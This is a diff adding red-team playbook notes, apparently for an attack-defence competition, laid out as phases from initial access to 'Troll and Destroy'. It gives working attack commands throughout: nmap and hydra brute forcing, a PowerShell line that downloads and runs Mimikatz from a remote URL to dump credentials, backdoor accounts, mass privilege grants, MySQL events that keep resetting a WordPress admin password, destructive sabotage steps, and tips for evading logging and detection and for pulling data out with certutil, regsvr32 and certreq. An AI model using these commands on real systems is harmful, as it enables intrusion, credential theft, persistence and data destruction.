@@ -1,0 +1,211 @@
+# past_import_notes
+
+
+notes-redteam
+
+→ https://community.rapid7.com/community/metasploit/blog/2009/02/23/the-best-defense-is-information
+→
+Understanding, anticipating, and identifying the wide array of evolving threats facing organizations today requires well-developed skills, experience, and analytical prowess. Current Incident Response programs can integrate Red team exercises to simulate an adversary’s mindset and tactics, techniques, and procedures (TTPs) to mature processes, validate system protections and enhance the skills of staff.
+
+
+# Phase 1; Initial Access:
+
+## Enumerate ports/services:
+Use “-oA name” in nmap to save scan data
+nmap -sn -n [targets]
+nmap -sP -PI -T4 -v7 [targets]
+nmap -sV -F [targets]
+
+(run these second)
+nmap -A [targets]
+nmap -p- -sV -O -T4 -v7 -sC [targets]
+(open SMB shares) nmap --script=smb-enum-shares -p445 [targets]
+(open NFS) nmap -p 111,2049 --script nfs-ls,nfs-showmount [targets]
+(optional) netscan
+(optional) Armitage/Cobalt Strike: Hosts -> Nmap Scan -> nmap quick scan with OS detection
+
+## Check for default credentials:
+Telnet/SSH Brute
+(Telnet) nmap -p 23 --script telnet-brute [targets]
+hydra -h [target]  -u [username]  -P /path/to/wordlist -M [telnet|ssh]
+
+Default SNMPgets check (if SNMP is found with previous scans)
+nmap -sU -p161 --script snmp-brute [targets]
+(optional) snmpwalk
+
+NBNS/LLMNR/WPAD Poisoning
+Responder + smbrelayx
+Domain Controller Anonymous Enumeration
+enum4linux
+Cain
+metasploit smb_enumusers
+metasploit smb_login module
+rpc-client
+Local Administrator Builtin 500 & Domain User Account Brute Forcing
+hydra -h [target]  -u [username]  -P /path/to/wordlist -M smbnt
+
+Anonymous FTP
+nmap -sC -sV -p21 [targets]
+
+VNC Brute
+nmap --script=vnc-brute -p5800,5900 
+
+Web Interface Review
+nmap
+rawr
+nikto
+burp pro (free if you don't have a license)
+praedasploit
+
+Ongoing nmap scan w/ ndiff of output
+
+## Drop payloads and privilege escalate:
+
+Unicorn powershell payloads
+Veil payloads
+
+Unquoted service path escalation (PowerUp)
+
+Intel gathering via PowerView
+
+psexec_loggedin_users to determine privileged accounts logged in
+
+meterpreter keyloging
+
+Wireshark + PCredz
+
+# Phase 2; Persistence Ideas:
+
+Ssh keys that we all have and can install on target machines.  Then the meta team can access via ssh keys to the targets
+
+Change nobody in /etc/passwd from nologin to /bin/bash and issue: passwd nobody
+Add sudoers
+Disable firewall
+Script to do the above in Debian/Ubuntu
+Add VNC Server
+Teamviewer MSI
+crontab
+add backdoor alias for common commands (such as sudo keylog)
+netcat local listeners and reverse connects
+reverse shell on startup (update-rc.d blah defaults for linux, scheduled tasks for windows)
+
+msf persistence (exploit/windows/local/persistence, run persistence)
+
+## Mimikatz: 
+powershell "IEX (New-Object Net.WebClient).DownloadString('http://is.gd/oeoFuI'); Invoke-Mimikatz -DumpCreds"
+
+Mimikatz on DC -
+misc::skeleton - On DC
+misc::memssp - All machines
+
+## Golden ticket:
+Note krbtgt hash - this will likely be duplicated across all teams’ networks, so one krbtgt hash == DA on all networks
+
+## Create backdoors:
+
+Add new user: net user /add admin admin
+Add user as local admin: net localgroup Administrators /add admin
+
+Sticky keys persistence(Shift x 5)/utilman(windows + U)/Display (Windows + P): 
+
+## Kill Windows Updates: 
+Screw with users/groups (some of these require domain admin privs)
+net localgroup administrators Everyone /add
+net localgroup administrators Everyone /add /domain
+net localgroup administrators  "Domain Users" /add
+net localgroup administrators  "Domain Users" /add /domain
+
+net localgroup "Remote Desktop Users" Everyone /add
+net localgroup "Remote Desktop Users" Everyone /add /domain
+net localgroup "Remote Desktop Users" "Domain Users" /add
+net localgroup "Remote Desktop Users" "Domain Users" /add /domain
+
+net user guest /active:yes
+net user guest /active:yes /domain
+net user guest Qwerty12345
+net user guest Qwerty12345 /domain
+
+net localgroup  administrators guest /add
+net localgroup  administrators guest /add /domain
+net group "Enterprise Admins" guest /add /domain
+net group "Domain Admins" guest /add /domain
+
+net localgroup "Server Operators" Everyone /add
+net localgroup "Server Operators" Everyone /add /domain
+net localgroup "Server Operators" "Domain Users" /add
+net localgroup "Server Operators" "Domain Users" /add /domain
+
+## Persistence on a vyatta router:
+
+## Wordpress persistence:
+
+Login to their mysql (username 'monty' & password 'some_pass'):
+use db;
+CREATE EVENT myEvent ON SCHEDULE at current_timestamp + INTERVAL 300 second DO update wp_users set user_pass='$P$BMiCbLbCxfCSQDNKy21EIxlFeLVcOm0' where ID='1';
+
+changes the admin pass to martian every 300 seconds:
+SET GLOBAL event_scheduler = ON;
+CREATE EVENT myEvent1 ON SCHEDULE EVERY 300 second DO CREATE USER 'monty'@'%' IDENTIFIED BY 'somepass';
+CREATE EVENT myEvent2 ON SCHEDULE EVERY 300 second DO GRANT ALL PRIVILEGES ON *.* TO 'monty'@'%' WITH GRANT OPTION;
+CREATE EVENT myEvent3 ON SCHEDULE EVERY 300 second DO update wp_users set user_pass='$P$BMiCbLbCxfCSQDNKy21EIxlFeLVcOm0' where ID='1';
+
+
+## Web Shells:
+PHP: 
+ASP:
+
+Use Domain Admin access to hashdump the Domain Controller
+
+psexec_command on subnets w/ found creds, or manually
+
+# Phase 3; Troll and Destroy:
+
+Drop or modify databases/web configs
+
+MS14-068 with goldenpac.py (impacket)
+
+Alias common commands (ls, cd, echo, vi, vim, nano) to do nothing or unexpected behavior
+
+Remove common binaries such as chattr, netstat, ps
+
+Replace hosts file (meterpreter> run hostedit -l /path/to/fakednsentries.txt)
+
+## Randomly bring down services: net stop [service_name]
+
+Hide taskbar & files
+
+Lock out domain accounts (smb_login + net accounts /domain output)
+
+## BieberFever kiosk mode:
+## Continuous reboots:
+
+
+Drawing network diagrams can really help, figure out the network topology.
+
+
+# Tips
+
+You can use high reputation redirectors like Google or AWS in c&c communications to bypass reputation based whitelists. @1ce7ea redteam
+Use cleanwipe for uninstalling Sep. It doesn't require Administrator privileges. @dimakoci_ redteam windows
+Scan all local network IP ranges(192.168,172.16,10.0) instead of the scope given. You can find the forgotten networks or hosts. @kayhankayihan pentest
+Use net user /dom instead of net user /domain. Second one may be being watch by endpoint solution. @vysecurity redteam pentest windows
+Use wmiexec instead of psexec. It makes less noise. redteam pentest windows
+If you need put a file on disk, use Alternate Data Streams. @Oddvarmoe redteam windows
+If you have low priv shell, use fake login prompt for credentials. @enigma0x3 redteam windows
+If you need plaintext credentials and you don't want to use mimikatz. Dump lsass and parse it in local. redteam windows
+Avoid wtmp logging with ssh -l username target -T. @pwnagelabs redteam linux
+Use kill -9 $$ for avoiding bash history on exit. @pwnagelabs redteam linux
+If you have a connection but NAC is blocking you. Listen to broadcasts and collect mac address. And use printer's macs for NAC bypass. redteam pentest
+Scan external network with Nessus, Netsparker etc. or make little DoS/DDoS attacks to hide real action from blue team. @corpuscallosum redteam
+Use ROPEMAKER method and CVE-2017-0199 for creating phishing mails. redteam
+You can download any files with signed certutil.exe like this:
+certutil -urlcache -split -f <url> <out_filename> redteam pentest windows
+You can run your dlls like this:
+regsrv32 /s /u dll_name redteam pentest windows
+You can run scripts remotely with regsvr32.exe like this:
+regsvr32 /s /n /u /i:<url> scrobj.dll @subTee redteam pentest windows
+Use smtp relay for internal phishing. redteam
+You can encrypt your payloads/macros with using target company domain name as key. redteam pentest windows
+You can use HKLM\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\ with Debugger value for persistence. redteam windows
+You must tune connection limit when using automatic vulnerability scanners for avoiding network dropouts. @Kayranfatih pentest
+You can use Windows's certreq.exe for data exfiltration. @doylersec redteam windows
